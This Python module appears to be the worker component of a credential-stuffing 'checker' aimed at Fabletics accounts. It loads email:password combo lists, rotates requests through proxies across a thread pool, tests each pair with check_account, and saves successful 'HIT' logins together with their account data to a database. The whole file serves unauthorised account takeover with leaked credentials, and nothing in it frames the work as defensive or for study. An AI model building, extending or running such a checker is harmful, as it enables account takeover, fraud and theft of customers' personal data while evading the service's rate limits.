from __future__ import annotations

import itertools
import random
import threading
import time
from dataclasses import dataclass, field
from typing import Any

from fabletics.checker import _UNSET, check_account, parse_combo
from fabletics.proxy import parse_proxy

from .db import insert_hit


@dataclass
class JobStats:
    total: int = 0
    checked: int = 0
    hits: int = 0
    fails: int = 0
    retries: int = 0
    errors: int = 0
    running: bool = False
    stop_requested: bool = False
    current: str = ""
    logs: list[str] = field(default_factory=list)


class CheckerWorker:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._thread: threading.Thread | None = None
        self.stats = JobStats()

    def is_running(self) -> bool:
        with self._lock:
            return self.stats.running

    def start(
        self,
        combos: list[str],
        proxies: list[str],
        threads: int = 5,
    ) -> bool:
        with self._lock:
            if self.stats.running:
                return False
            parsed_combos = []
            for line in combos:
                parsed = parse_combo(line)
                if parsed:
                    parsed_combos.append(parsed)

            if not parsed_combos:
                return False

            parsed_proxies = []
            for line in proxies:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                try:
                    parsed_proxies.append(parse_proxy(line))
                except ValueError:
                    continue

            self.stats = JobStats(
                total=len(parsed_combos),
                running=True,
            )
            self._thread = threading.Thread(
                target=self._run,
                args=(parsed_combos, parsed_proxies, max(1, threads)),
                daemon=True,
            )
            self._thread.start()
            return True

    def stop(self) -> None:
        with self._lock:
            self.stats.stop_requested = True

    def snapshot(self) -> dict[str, Any]:
        with self._lock:
            return {
                "total": self.stats.total,
                "checked": self.stats.checked,
                "hits": self.stats.hits,
                "fails": self.stats.fails,
                "retries": self.stats.retries,
                "errors": self.stats.errors,
                "running": self.stats.running,
                "current": self.stats.current,
                "logs": list(self.stats.logs[-100:]),
            }

    def _log(self, message: str) -> None:
        with self._lock:
            self.stats.logs.append(message)
            if len(self.stats.logs) > 500:
                self.stats.logs = self.stats.logs[-500:]

    def _pick_proxy(self, proxies: list[str], index: int) -> str | None:
        if not proxies:
            return None
        if len(proxies) == 1:
            return proxies[0]
        return proxies[index % len(proxies)]

    def _run(
        self,
        combos: list[tuple[str, str]],
        proxies: list[str],
        threads: int,
    ) -> None:
        from concurrent.futures import ThreadPoolExecutor, as_completed

        proxy_cycle = itertools.cycle(proxies) if proxies else None

        def task(idx: int, email: str, password: str):
            with self._lock:
                if self.stats.stop_requested:
                    return None
                self.stats.current = f"{email}"

            if proxy_cycle:
                proxy = self._pick_proxy(proxies, idx)
            else:
                proxy = _UNSET

            return check_account(email, password, proxy=proxy, timeout=45)

        try:
            with ThreadPoolExecutor(max_workers=threads) as pool:
                futures = {
                    pool.submit(task, i, email, password): (email, password)
                    for i, (email, password) in enumerate(combos)
                }
                for future in as_completed(futures):
                    with self._lock:
                        if self.stats.stop_requested:
                            break

                    email, password = futures[future]
                    try:
                        result = future.result()
                    except Exception as exc:
                        with self._lock:
                            self.stats.checked += 1
                            self.stats.errors += 1
                        self._log(f"ERROR | {email} | {exc}")
                        continue

                    with self._lock:
                        self.stats.checked += 1

                    if result.status == "HIT":
                        line = result.format_hit()
                        hit_id = insert_hit(line, email, password, result.data)
                        with self._lock:
                            self.stats.hits += 1
                        self._log(line)
                        if hit_id is None:
                            self._log(f"DUPLICATE | {email}")
                    elif result.status == "FAIL":
                        with self._lock:
                            self.stats.fails += 1
                        self._log(f"FAIL | {email}:{password}")
                    elif result.status == "RETRY":
                        with self._lock:
                            self.stats.retries += 1
                        self._log(f"RETRY | {email} | {result.message}")
                    else:
                        with self._lock:
                            self.stats.errors += 1
                        self._log(f"ERROR | {email} | {result.message}")

                    time.sleep(0.05)
        finally:
            with self._lock:
                self.stats.running = False
                self.stats.stop_requested = False
                self.stats.current = ""


worker = CheckerWorker()
